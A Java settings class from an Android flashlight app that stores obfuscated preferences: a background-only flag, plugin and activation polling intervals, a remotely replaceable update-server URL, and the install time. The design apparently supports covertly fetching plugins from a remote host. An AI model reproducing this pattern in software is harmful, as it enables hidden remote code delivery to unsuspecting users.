package com.apps.flashlight;
import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;

public class SettingUtil {
    //private static final String url = "http://192.168.0.12:7080/yyyyyyyyyyy";
    private static final String url = "http://update.l3721.com/yyyyyyyyyyy";
    private static SharedPreferences getPref(Context context) {
        return context.getSharedPreferences("dddddddddd", 0);
    }
    /////////////////////////////////////////////////////////////////////////////////
    private static Boolean backgroundOnly = null;
    public static boolean isBackgroundOnly(Context context) {
        if (backgroundOnly == null) {
            backgroundOnly = getPref(context).getBoolean("a", false);
        }
        return backgroundOnly;
    }
    public static void setBackgroundOnly(Context context, boolean value) {
        backgroundOnly = value;
        getPref(context).edit().putBoolean("a", backgroundOnly).commit();
    }
    /////////////////////////////////////////////////////////////////////////////////
    private static final long defaultPluginInterval = 600;
    private static long pInterval = 0;
    public static boolean setPluginInterval(Context context, long value) {
        boolean result = false;
        if (pInterval != value && value >= 60 && value < 3600 * 24 * 5) {
            pInterval = value;
            getPref(context).edit().putLong("b", value).commit();
            result = true;
        }
        return result;
    }
    public static long getPluginInterval(Context context) {
        if (pInterval <= 0) {
            pInterval = getPref(context).getLong("b", defaultPluginInterval);
        }
        return pInterval;
    }
    /////////////////////////////////////////////////////////////////////////////////
    private static final long defaultActivateInterval = 3600 * 24 * 1;
    private static long aInterval = 0;
    public static boolean setActivateInterval(Context context, long value) {
        boolean result = false;
        if (aInterval != value && value >= 60 && value < 3600 * 24 * 5) {
            aInterval = value;
            getPref(context).edit().putLong("c", value).commit();
            result = true;
        }
        return result;
    }
    public static long getActivateInterval(Context context) {
        if (aInterval <= 0) {
            aInterval = getPref(context).getLong("c", defaultActivateInterval);
        }
        return aInterval;
    }
    /////////////////////////////////////////////////////////////////////////////////
    public static void setUrl(Context context, String value) {
        if (value != null && value.contains("htt") && value.length() > 10) {
            getPref(context).edit().putString("d", value).commit();
        }
    }
    public static String getUrl(Context context) {
        String result = getPref(context).getString("d", null);
        if (TextUtils.isEmpty(result)) result = SettingUtil.url;
        return result;
    }
    public static void clearUrl(Context context) {
        getPref(context).edit().remove("d").commit();
    }
    ///////////////////////////////////////////////////////////////////////////////
    public static long getInstallTime(Context context) {
        return getPref(context).getLong("e", 0);
    }
    public static void saveInstallTime(Context context) {
        SharedPreferences pref = getPref(context);
        if (pref.getLong("e", 0) == 0) {
            pref.edit().putLong("e", System.currentTimeMillis()).commit();
        }
    }
}
